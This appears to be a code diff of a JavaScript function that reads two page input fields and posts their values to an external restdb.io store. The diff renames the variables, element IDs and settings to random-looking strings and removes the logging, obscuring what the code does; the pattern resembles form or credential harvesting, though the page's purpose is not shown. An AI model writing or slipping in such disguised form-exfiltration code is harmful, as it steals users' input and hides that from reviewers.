@@ -1,20 +1,11 @@
-var adfanb118 = "#test1";
-var hag1t49108 = "#test2";
-
-
-
-
-
+var adfaadfbjkadfnb118 = "#afdnklasdfk1bjsvajk";
+var adfabdfakjbasdfbak = "#bjkabjabjkadbjlkvalk1412";
 function aadfa1kabjkadbjka1() {
+  var f12bjkabjkbjka3221 = $(adfaadfbjkadfnb118).val();
+  var s44ajkabdfkaadfa14 = $(adfabdfakjbasdfbak).val();
+  var adfbkasdfadfjkbabjkjka = {"c1": f12bjkabjkbjka3221,"c2": s44ajkabdfkaadfa14};
 
-
-  var f123221 = $(adfanb118).val();
-  var s44adfa14 = $(hag1t49108).val();
-
-  var jsondata = {"c1": f123221,"c2": s44adfa14};
-
-
-  var settings = {
+  var knadkadnkadsklaadfbjjk = {
     "async": true,
     "crossDomain": true,
     "url": "https://learn-29ef.restdb.io/rest/store",
@@ -25,18 +16,13 @@ function aadfa1kabjkadbjka1() {
       "cache-control": "no-cache"
     },
     "processData": false,
-    "data": JSON.stringify(jsondata)
+    "data": JSON.stringify(adfbkasdfadfjkbabjkjka)
   }
-  console.log(JSON.stringify(jsondata));
 
-  $.ajax(settings).done(function (response) {
+  $.ajax(knadkadnkadsklaadfbjjk).done(function (response) {
     console.log(response);
-
   });
-  console.log(response);
 
-  console.log(JSON.stringify(jsondata));
-  console.log(settings);
 
 }
 
